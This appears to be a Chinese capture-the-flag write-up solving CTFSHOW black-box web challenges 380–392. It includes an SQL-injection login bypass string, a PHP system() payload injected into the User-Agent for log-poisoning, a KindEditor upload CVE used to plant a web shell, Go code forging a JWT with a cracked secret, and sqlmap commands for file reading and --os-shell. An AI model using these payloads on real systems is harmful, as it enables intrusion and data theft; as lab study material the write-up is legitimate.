CTFSHOW - 黑盒测试

1. web380

扫描了一下目录

访问 page.php

id 没有传值，使用 GET 方式传入 /page.php?id=1

读取了 1.php，修改 id 为 flag 访问 /page.php?id=flag

查看源码获得 flag

2. web381

查看页面源码

访问 /alsckdfy/ 进入后台

3. web382 - web383

访问 /alsckdfy/ 进入后台

使用弱口令登录 admin’ or 1=1# / 123456

4. web384

题目提示密码前2位是小写字母，后三位是数字，进行爆破

最后爆破出来密码为 xy123

5. web385

扫描一下目录

多出了一个 /install，访问 /install

再访问 /install/?install

然后登录后台使用 admin / admin888 登录

6. web386

扫描下目录

存在个 clear.php

先访问 /install

访问 /clear.php

但是访问 /install 后是要清理，应该需要指定文件进行删除文件

访问 /clear.php?file=./install/lock.dat 清除文件

然后访问 /install/?install 后使用默认用户登录

7. web387

扫描目录看一下增加了啥

多了个 debug，使用 clear.php 删除不掉文件了，访问 /debug

测试一下在 参数 file 处可以进行文件包含，包含日志 getshell

在 UA 中插入 <?php system('rm /var/www/html/install/lock.dat');?> 删除掉配置文件

然后进行上一题的步骤进入后台拿 flag

8. web388

扫描下 /alsckdfy/ 目录

还存在一个编辑器

访问 /alsckdfy/editor/ 为 KindEditor

访问/alsckdfy/editor/kindeditor.js 获得版本为 KindEditor 4.1.11，这个版本存在文件上传漏洞 CVE-2017-1002024

上传一个 shell

访问 clear.php 发现会将结果写入到日志中，然后包含日志，随后访问 /shell.php 获得 shell

然后读取 /alsckdfy/check.php 获得 flag

9. web389

访问 /debug/ 提示权限不足

存在 JWT 认证，爆破一手秘钥

拿着该秘钥生成新 token

package main

import (
	"fmt"
	"github.com/golang-jwt/jwt/v4"
)

func main() {
	claims := jwt.MapClaims{
		"iss": "admin",
		"iat": 1675417117,
		"exp": 1675424317,
		"nbf": 1675417117,
		"sub": "admin",
		"jti": "7b5244b58cdc39cea008baa362b8ea9f",
	}
	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
	signedString, err := token.SignedString([]byte("123456"))
	if err != nil {
		return
	}
	fmt.Printf("token = %v", signedString)
}

带着 token 访问

之后的步骤和上一题一样

10. web390

在 page.php 处存在 sql 注入，直接上 sqlmap 跑读取文件

sqlmap -u http://508a94c9-0f28-42e5-add0-ce18ba09d0bd.challenge.ctf.show/page.php?id=1 --file-read "/var/www/html/alsckdfy/check.php"

11. web391

扫描目录

多出来一个 search.php，参数为 title

一样拿 sqlmap 跑

12. web392

还是在 search.php 进行 sql 注入，这次直接获得shell

sqlmap -u http://42449ce0-4bf7-4e44-8e3f-a1e7380a4867.challenge.ctf.show/search.php?title=1 --os-shell
